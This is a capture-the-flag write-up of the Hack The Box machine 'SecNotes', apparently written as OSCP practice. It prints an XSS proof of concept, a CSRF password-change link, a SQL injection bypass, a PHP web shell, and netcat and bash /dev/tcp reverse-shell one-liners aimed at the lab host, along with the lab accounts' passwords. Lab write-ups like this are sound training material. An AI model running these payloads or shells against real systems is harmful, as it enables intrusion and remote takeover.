---
title: "SecNotes HTB"
date: 2024-07-02 21:55:00 +0800
categories: [SecNotes, Medium]
tags: [Secnotes]
---


![Untitled](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uMQqZEswmPNsTNV0HSvfeQ.jpeg)
Another Retired Machine in the path of progressing for the OSCP.
Reconnaissance:
Analyzing Nmap result:


we don’t really have that many ports to attack except 80 HTTP, 445 NetBIOS, and 8808 HTTP.

Enumeration:
Getting started with our 445 SMB, we don’t really have anything right now. Since an anonymous login is not allowed in this case. enum4linux or smbmap or smbclient. Has no use right now. There seems to be a website running on port 80 http. So, browsing to http://10.10.10.97 would let us redirected to the /login.html.


You can always try default credentials such as admin-password or user-password etc; And then wordlists or some SQL injections for fuzzing.

Method #1 Cross-Site Request Forgery:
Sign up now button:

Since, There is a signup button we can register a user ourselves, and logging in can grant us a new empty user.



By understanding these options one by one in hand. can help us understand what type of vulnerabilities were present in the web server manually.

Create New Note:

In the view source(Ctrl+U) I’ve seen the Note textarea box has been enclosed by <textarea> HTML tag. So, I’m gonna close it with </textarea> and use our script command. If in this case it doesn’t we will go crafting it further improvising.

For the POC (proof of concept) document.write(document.cookie) inside the <script> tag.


Saving it redirects to the home page. And it’s working. we just discovered an XSS Vulnerability.

Contact Us:


There is a message box that seems to help us contact Tyler. So, Tyler seems to be an authenticated user. After sending it, it just redirects with a Pop up on the home screen “Message Sent”.


Update Password:

Interestingly, They weren’t asking for the old password while updating the new password. This might help us combine all other functionalities together to get access to Tyler’s user account.

While listening on port 80 with nc -lvnp 80 on our attack machine and sending the message.



Gave us info, That there was a connection from port 51601 Windows Powershell from our victim machine. This means the Tyler user is automatically accessing the link.

Exploitation:
We this information in hand we can totally compromise the Tyler account😁. How?

Let’s Dive in,

While changing the password if intercept the request.


Right-click on the code and select the change request method.


Since Whatever link is being opened seems to be opened by Tyler. At this point. we could try injecting an HTML payload for a CMD shell.

But our end goal here is to change the password. Based on this burp suite request we can make Tyler open the link to change his own password.

http://10.10.10.97/change_pass.php?password=password&confirm_password=password&submit=submit
http:10.10.14.17

Now, let’s contact Tyler!!


With that, the password would be changed!!!!

Try logging, in with our new password and this should be working😁.


If this wasn’t working,


Method #2: Alternate way [SQL Injection]:
Since The server is been accessing the different notes with ID, So there should be a database running along with the web server.

Since horizontal access is prevented from accessing the ID of the note. Let’s start enumeration with the register. If we can get some account. The fact that you can create a password for a valid user is possible. Makes this more possible. You can fire up the burp suite and do some brute-forcing with the following SQL Injection list. To find the one that’s working.


This should be working since Select * from users WHERE “Hello OR 1=1 —

Always comes out to be TRUE.


Where “—” is for commenting out in HTML. This gonna work. Since The web server is vulnerable to SQL Injections.

Logging in with our new credentials should let us access the Tyler User. Since it seemed to be the only other valid user.



Getting a Shell:

Browsing through the notes we can spot there is a sub-directory and the other information looks like it is the username and password.

With all this let’s see if we access the SMB Shares. Since the Anonymous login didn’t work out. This might be our shot.

First, let’s verify that with the smbmap for detailed information on what’s there to come.

smbmap -H 10.10.10.97 -u tyler -p ‘92g!mA8BGjOirkL%OG*&’


There is a share we can access here and have read and write permissions. Let’s dive in!!

smbclient \\\\10.10.10.97\\new-site -U tyler

And Enter the password. That lets us to SMB Shell.



The files resemble the iisstart page we got on the port 8808.


Possibly these web servers are accessing files from these shares.

I tried generating a .aspx payload with msfvenom, but it didn’t work out. So, the web server seems to accept only php files. Fortunately for us, PHP files can call system commands, so let us craft a PHP file and upload it.


Fortunately for us, PHP files can call system commands, so let us craft a PHP file and upload it.


<?php echo “Shell”;system($_GET[‘cmd’]); ?>

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/shell.php

on SMB shell upload this payload using the put command. put shell.php


For getting a PowerShell we need a Netcat one-liner to be executed as a command. I’ll show you what I mean.

nc.exe 10.10.14.17 443 -e powershell

you can easily spot the nc.exe file in /usr/share/seclists/Web-Shells/FuzzDB if you’re using Kali Linux.

Be sure to upload Netcat and the payload again(it gets deleted after some time since the server completely blocks it).


Titidi dididi!! We got our Foothold with the powershell. with the same shell as smb but we have more control now🥳.


Grab the user flag🤧.



Getting a user flag is the hardest part for the Medium machine at Hackthebox.

Now now, Let’s hunt the root flag…😋


Privilege Escalation:
Now, as we have some foothold for the machine.

There is a file check-message.ps1 inside secnotes_contacts dir inside tyler’s directory.

Which has Tyler’s default password: “forested85sunk” which automatically changes every 30 seconds with this script. use these credentials for login, If your tired of using the sql injection or csrf.


With Netcat, I couldn’t access or run some basic commands. So, I have decided to upgrade the command shell from Netcat to the Meterpreter shell.

In addition to this, I have uploaded a step-by-step tutorial to upgrade the Netcat shell here.

Let’s browse around to see… what we have right now.


There seems to be a bash link file. Which is a good sign, bash files are executed at kernel-level access. Meaning it has root privileges.


But, When I tried executing it. it is not recognized. Seems like the file has been moved from Windows\System32 to somewhere else.

Let’s search for it.


Change the directory to that folder, And let’s see if it’s working.


Just as we thought, It does have the root privileges. So, For this to work, I have searched one-liner for reverse shells using bash || wanna Explore-More?.

bash -i >& /dev/tcp/10.10.14.17/443 0>&1


Running this together and listening for this port through Netcat.

bash.exe -c “bash -i >& /dev/tcp/10.10.14.17/443 0>&1”


nc -lvnp 443 on our kali machine.


We got the Root Shell. Since the desktop runs a WSL we are accessing a Ubuntu machine. The shell is so floppy.



Normally listing it makes the files hidden. Since, They were created default by bash command as binaries.

So, use ls -alps or ls -al


We can see there is a bash_history file, Looks interesting.

cat bash_history,


And we have an Administrator and its password in the history🤩🤩!!

Let’s Verify it with smbmap,

smbmap -u ’administrator’ -p ‘u6!4ZwgwOM#^OBf#Nwnh’ -H 10.10.10.97


We have all the privileges C$ and ADMIN$ SMB Share too!!🤧



Root flag🥳🫡!!!


Kanpai

In-Summary:

SecNotes is a medium-difficulty machine that highlights the risks associated with weak password change mechanisms, lack of CSRF protection, and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration.

Mind Map (Why we are doing, What we are doing?):


Made with xmind.
Follow me, for more Priv Escalations / Active Directory Concepts!! Thank you for reading :-)